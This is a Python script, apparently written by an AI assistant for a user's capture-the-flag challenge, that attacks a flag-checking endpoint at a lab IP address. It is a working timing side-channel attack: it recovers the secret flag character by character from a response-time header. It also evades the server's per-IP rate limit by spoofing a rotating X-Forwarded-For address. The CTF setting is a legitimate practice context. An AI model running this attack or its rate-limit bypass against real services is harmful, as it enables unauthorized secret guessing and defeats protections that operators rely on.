#!/usr/bin/env python3

"""
Timing-based flag extractor for the CTF "Flag Checker" described by the user.

- Target: http://10.1.90.89:5000/submit?flag=[OUR_FLAG]
- Uses X-Forwarded-For header to rotate source IP after 3 requests.
- Uses X-Response-Time response header as the timing signal (float).
- Flag format: flag{[0-9a-f]{32}}
- Character order: 'a'..'f' then '0'..'9' (per the description to try 'a' first).
"""

import requests
import random
import time
import sys

TARGET_BASE = "http://10.1.90.89:5000/submit?flag="
MAX_PER_IP = 3  # server allows max 3 requests per IP
HEX_ORDER = "abcdef0123456789"  # try a-f first (user requested starting at 'a'), then 0-9
BUFFER = 0.05 # minimal difference between baseline and attempt to count as valid

def random_ipv4():
    """Generate a random (non-special) IPv4 address as a string."""
    # Avoid obvious private ranges: 10., 172.16-31., 192.168., 127., multicast, broadcast
    while True:
        a = random.randint(1, 254)
        b = random.randint(0, 255)
        c = random.randint(0, 255)
        d = random.randint(1, 254)
        # skip private/reserved ranges
        if a == 10: continue
        if a == 127: continue
        if a == 192 and b == 168: continue
        if a == 172 and 16 <= b <= 31: continue
        if 224 <= a <= 239: continue  # multicast
        return f"{a}.{b}.{c}.{d}"

class IPRotator:
    """Return an X-Forwarded-For IP, rotate after MAX_PER_IP requests."""
    def __init__(self, max_per_ip=MAX_PER_IP):
        self.max_per_ip = max_per_ip
        self.current_ip = random_ipv4()
        self.counter = 0

    def next_header(self):
        if self.counter >= self.max_per_ip:
            self.current_ip = random_ipv4()
            self.counter = 0
        self.counter += 1
        return {"X-Forwarded-For": self.current_ip}

def get_x_response_time(resp):
    """Extract X-Response-Time header and return as float. Return None if missing/invalid."""
    hdr = resp.headers.get("X-Response-Time")
    if hdr is None:
        return None
    try:
        # header might be in seconds (e.g. 0.123) or ms (e.g. 123). We'll parse float.
        return float(hdr)
    except ValueError:
        return None

def probe_flag(prefix, rotator, timeout=5.0):
    """Send one request with the given prefix, return X-Response-Time (float) or None if missing/error."""
    url = TARGET_BASE + requests.utils.quote(prefix, safe='{}')
    headers = rotator.next_header()
    try:
        r = requests.get(url, headers=headers, timeout=timeout)
    except requests.RequestException as e:
        print(f"[!] Request error for prefix {prefix!r}: {e}", file=sys.stderr)
        return None
    xrt = get_x_response_time(r)
    if xrt is None:
        print(f"[!] Response had no X-Response-Time header for prefix {prefix!r}", file=sys.stderr)
    return xrt

def recover_flag():
    rotator = IPRotator()
    flag_prefix = "flag{"  # we start from this
    # get baseline for 'flag{' to start
    baseline = probe_flag(flag_prefix, rotator)
    if baseline is None:
        print("[!] Could not read baseline X-Response-Time for initial prefix 'flag{'. Aborting.")
        return None
    print(f"[+] Baseline for {flag_prefix!r}: {baseline}")

    # we know there are 32 hex chars inside braces
    total_hex = 32
    recovered = ""
    for pos in range(total_hex):
        found = False
        print(f"[+] Recovering char {pos+1}/{total_hex} (current: {flag_prefix + recovered})")
        # for each candidate in order specified
        for ch in HEX_ORDER:
            candidate = flag_prefix + recovered + ch
            xrt = probe_flag(candidate, rotator)
            if xrt is None:
                # treat as non-matching and continue; optionally retry
                print(f"    - {candidate!r} -> no X-Response-Time, skipping")
                continue
            print(f"    - try {ch!r}: X-Response-Time={xrt} (baseline {baseline})")
            # A strictly larger response time indicates a correct next-character (per challenge description)
            if xrt > (baseline + BUFFER):
                recovered += ch
                baseline = xrt  # new baseline becomes the response time for the correct prefix
                print(f"[+] Found char #{pos+1}: {ch!r} -> new prefix: {flag_prefix + recovered + ('...' if len(recovered)<total_hex else '')}")
                found = True
                break
            # else not the right char; continue trying
        if not found:
            print(f"[!] No candidate caused an increase for position {pos+1}.")
            # Optionally: try more attempts, or expand character set, or retry same candidates.
            # Here we will attempt a small number of retries for each candidate before giving up.
            # Do a limited retry loop
            RETRIES = 2
            retry_success = False
            for attempt in range(RETRIES):
                print(f"[~] Retrying position {pos+1}, attempt {attempt+1}/{RETRIES}...")
                for ch in HEX_ORDER:
                    candidate = flag_prefix + recovered + ch
                    xrt = probe_flag(candidate, rotator)
                    if xrt is None:
                        continue
                    print(f"    - retry try {ch!r}: X-Response-Time={xrt} (baseline {baseline})")
                    if xrt > baseline:
                        recovered += ch
                        baseline = xrt
                        print(f"[+] (retry) Found char #{pos+1}: {ch!r}")
                        retry_success = True
                        break
                if retry_success:
                    break
            if not retry_success:
                print("[!] Could not determine next character. Aborting and returning what we have so far.")
                break

    full_flag = flag_prefix + recovered + "}"
    print(f"[+] Recovered (partial/full) flag: {full_flag}")
    return full_flag

if __name__ == "__main__":
    print("Starting timing attack. This may send many requests. Press Ctrl-C to stop.")
    try:
        result = recover_flag()
        print("Result:", result)
    except KeyboardInterrupt:
        print("\nInterrupted by user.")
